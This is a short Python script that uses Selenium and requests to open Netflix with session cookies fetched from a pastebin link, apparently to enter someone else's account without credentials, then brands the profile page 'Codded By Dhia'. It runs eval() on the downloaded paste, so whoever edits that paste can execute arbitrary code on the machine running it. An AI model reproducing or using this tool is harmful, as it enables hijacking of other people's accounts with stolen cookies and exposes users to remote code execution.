#import Libraries
import requests
import json
import selenium.webdriver

def add():
    global driver
    
    driver = selenium.webdriver.Chrome()
    response = requests.get("https://pastebin.com/raw/mETPRg6x")
    data = response.text
    data = eval(data)
    

    

    driver.get("https://www.netflix.com/")
    cookies = list(data)
    for cookie in cookies:
        driver.add_cookie(cookie)
    driver.get("https://www.netflix.com/browse")
    driver.execute_script("document.getElementsByClassName('profile-gate-label')[0].childNodes[0].textContent = 'Codded By Dhia'")

#Gui Configurations
add()
